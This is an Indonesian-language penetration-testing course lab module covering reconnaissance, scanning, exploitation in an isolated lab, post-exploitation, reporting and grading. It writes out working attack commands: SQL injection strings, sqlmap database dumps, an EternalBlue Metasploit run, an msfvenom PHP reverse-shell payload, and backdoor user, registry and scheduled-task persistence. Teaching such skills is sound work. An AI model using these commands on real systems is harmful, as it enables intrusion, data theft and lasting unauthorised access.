# Praktikum Modul 3: Vulnerability Assessment dan Penetration Testing

## Pendahuluan

Praktikum ini fokus pada pemahaman dan implementasi proses Vulnerability Assessment dan Penetration Testing (VAPT). Siswa akan mempelajari metodologi, tools, dan teknik yang digunakan dalam mengidentifikasi, menganalisis, dan melaporkan kerentanan keamanan sistem.

## Tujuan Pembelajaran

Setelah menyelesaikan praktikum ini, siswa diharapkan mampu:
1. Memahami konsep dan metodologi VAPT
2. Menggunakan tools scanning dan assessment
3. Melakukan analisis kerentanan sistem
4. Membuat laporan VAPT yang profesional
5. Menerapkan langkah-langkah mitigasi kerentanan

## Persiapan Lab Environment

### A. Setup Lab Network

1. **Konfigurasi Network**
   ```bash
   # Setup isolated network di VirtualBox
   Name: PenTest-Lab
   Network CIDR: 192.168.56.0/24
   DHCP: Disabled
   ```

2. **Virtual Machines Setup**
   - Kali Linux (Attacker)
   - Metasploitable 2 (Target 1)
   - Windows 7 SP1 (Target 2)
   - DVWA (Target 3)

### B. Tools Installation

1. **Scanner Tools**
   ```bash
   # Install vulnerability scanner
   sudo apt update
   sudo apt install -y \
       nmap \
       nikto \
       wpscan \
       sqlmap \
       dirb \
       gobuster
   ```

2. **Reporting Tools**
   ```bash
   # Install documentation tools
   sudo apt install -y \
       cutycapt \
       recordmydesktop \
       flameshot
   ```

## Lab 1: Information Gathering

### A. Passive Reconnaissance

1. **OSINT Tools**
   ```bash
   # Whois lookup
   whois example.com
   
   # DNS enumeration
   dnsenum example.com
   
   # Google dorks
   site:example.com filetype:pdf
   inurl:admin site:example.com
   ```

2. **Social Engineering**
   ```bash
   # TheHarvester
   theHarvester -d example.com -l 500 -b google
   
   # LinkedIn enumeration
   sudo apt install -y linkedin2username
   ```

### B. Active Scanning

1. **Network Scanning**
   ```bash
   # Basic Nmap scan
   nmap -sS -sV -O 192.168.56.0/24
   
   # Advanced scan
   nmap -sS -sV -O -p- -A --script vuln 192.168.56.100
   ```

2. **Web Application Scanning**
   ```bash
   # Nikto scan
   nikto -h http://192.168.56.100
   
   # Directory enumeration
   gobuster dir -u http://192.168.56.100 -w /usr/share/wordlists/dirb/common.txt
   ```

## Lab 2: Vulnerability Assessment

### A. Network Vulnerability Assessment

1. **Port Analysis**
   ```bash
   # Service version detection
   nmap -sV -p- 192.168.56.100
   
   # NSE scripts
   nmap --script=vuln,exploit 192.168.56.100
   ```

2. **Protocol Analysis**
   ```bash
   # SMB enumeration
   enum4linux -a 192.168.56.100
   
   # SSL/TLS testing
   sslyze --regular 192.168.56.100
   ```

### B. Web Application Assessment

1. **Web Scanner**
   ```bash
   # OWASP ZAP CLI
   zap-cli quick-scan -s all http://192.168.56.100
   
   # Skipfish scan
   skipfish -o /tmp/skipfish http://192.168.56.100
   ```

2. **Manual Testing**
   ```bash
   # SQL injection testing
   sqlmap -u "http://192.168.56.100/page.php?id=1" --dbs
   
   # XSS testing
   wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/XSS.txt http://192.168.56.100/page.php?id=FUZZ
   ```

## Lab 3: Exploitation Basics

### A. Metasploit Framework

1. **Setup MSF**
   ```bash
   # Start services
   sudo systemctl start postgresql
   sudo msfdb init
   
   # Launch MSF
   msfconsole
   ```

2. **Basic Exploitation**
   ```bash
   # Search exploits
   search type:exploit platform:windows
   
   # Use exploit
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 192.168.56.100
   exploit
   ```

### B. Web Exploitation

1. **SQL Injection**
   ```bash
   # Manual injection
   ' OR '1'='1
   ' UNION SELECT null,null,@@version--
   
   # Automated exploitation
   sqlmap -u "http://192.168.56.100/login.php" --forms --dump
   ```

2. **File Upload Vulnerabilities**
   ```bash
   # Generate payload
   msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
   
   # Setup listener
   use exploit/multi/handler
   set payload php/meterpreter/reverse_tcp
   ```

## Lab 4: Post Exploitation

### A. Privilege Escalation

1. **Linux PrivEsc**
   ```bash
   # Enumeration
   ./LinEnum.sh
   ./linux-exploit-suggester.sh
   
   # Common techniques
   sudo -l
   find / -perm -u=s -type f 2>/dev/null
   ```

2. **Windows PrivEsc**
   ```bash
   # PowerShell enumeration
   PowerUp.ps1
   Sherlock.ps1
   
   # Token impersonation
   incognito
   list_tokens -u
   ```

### B. Persistence

1. **Linux Persistence**
   ```bash
   # Create backdoor user
   useradd -m -s /bin/bash backdoor
   echo "backdoor:password" | chpasswd
   usermod -aG sudo backdoor
   ```

2. **Windows Persistence**
   ```bash
   # Registry autorun
   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
   
   # Scheduled task
   schtasks /create /tn Backdoor /tr C:\backdoor.exe /sc onstart
   ```

## Lab 5: Reporting

### A. Documentation

1. **Evidence Collection**
   ```bash
   # Screenshot automation
   cutycapt --url=http://192.168.56.100 --out=screenshot.png
   
   # Video recording
   recordmydesktop --no-sound -o pentest.ogv
   ```

2. **Report Template**
   ```markdown
   # Executive Summary
   # Methodology
   # Findings
   # Proof of Concept
   # Recommendations
   # Appendices
   ```

### B. Remediation

1. **Vulnerability Fixes**
   ```bash
   # Update systems
   sudo apt update && sudo apt upgrade -y
   
   # Harden configurations
   sudo chmod 600 /etc/shadow
   sudo ufw enable
   ```

2. **Security Baseline**
   ```bash
   # CIS Benchmarks
   sudo apt install -y lynis
   sudo lynis audit system
   ```

## Evaluasi

### A. Kriteria Penilaian

1. **Kemampuan Teknis (40%)**
   - Scanning dan enumeration
   - Vulnerability assessment
   - Exploitation skills
   - Post-exploitation

2. **Dokumentasi (30%)**
   - Kualitas laporan
   - Screenshot dan bukti
   - Rekomendasi mitigasi
   - Metodologi

3. **Keaktifan (30%)**
   - Partisipasi lab
   - Inisiatif
   - Problem solving
   - Kerja tim

### B. Deliverables

1. **Laporan VAPT**
   - Format: PDF
   - Minimal 20 halaman
   - Screenshot setiap langkah
   - PoC untuk setiap vulnerability

2. **Presentasi**
   - 15 menit presentasi
   - 10 menit demo
   - 5 menit Q&A
   - Slide deck

## Referensi

1. OWASP Testing Guide
2. Red Team Field Manual (RTFM)
3. Penetration Testing: A Hands-On Introduction
4. The Hacker Playbook 3
5. Web Application Hacker's Handbook
6. Metasploit: The Penetration Tester's Guide

## Appendix

### A. Cheat Sheets

1. **Nmap**
   ```bash
   # Quick scan
   nmap -sC -sV -oA quick 192.168.56.100
   
   # Full scan
   nmap -sC -sV -p- -oA full 192.168.56.100
   
   # UDP scan
   nmap -sU -p- -oA udp 192.168.56.100
   ```

2. **Metasploit**
   ```bash
   # Database
   db_status
   workspace -a pentest
   hosts
   services
   
   # Exploitation
   search cve:2021
   set payload windows/x64/meterpreter/reverse_tcp
   sessions -i 1
   ```

### B. Report Templates

1. **Executive Summary Template**
   ```markdown
   # Overview
   - Scope
   - Objectives
   - Timeline
   
   # Key Findings
   - Critical
   - High
   - Medium
   - Low
   
   # Risk Matrix
   - Impact
   - Likelihood
   - CVSS Scores
   ```

2. **Technical Report Template**
   ```markdown
   # Methodology
   - Reconnaissance
   - Scanning
   - Exploitation
   - Post Exploitation
   
   # Vulnerability Details
   - Description
   - Proof of Concept
   - Impact
   - Remediation
   ```

### C. Security Tools Matrix

1. **Information Gathering**
   - [ ] Nmap
   - [ ] Nikto
   - [ ] theHarvester
   - [ ] Recon-ng
   - [ ] Maltego

2. **Vulnerability Assessment**
   - [ ] OpenVAS
   - [ ] Nessus
   - [ ] OWASP ZAP
   - [ ] Burp Suite
   - [ ] WPScan

3. **Exploitation**
   - [ ] Metasploit
   - [ ] SQLmap
   - [ ] BeEF
   - [ ] Social Engineer Toolkit
   - [ ] Hydra

4. **Post Exploitation**
   - [ ] Mimikatz
   - [ ] PowerSploit
   - [ ] Empire
   - [ ] Covenant
   - [ ] CrackMapExec
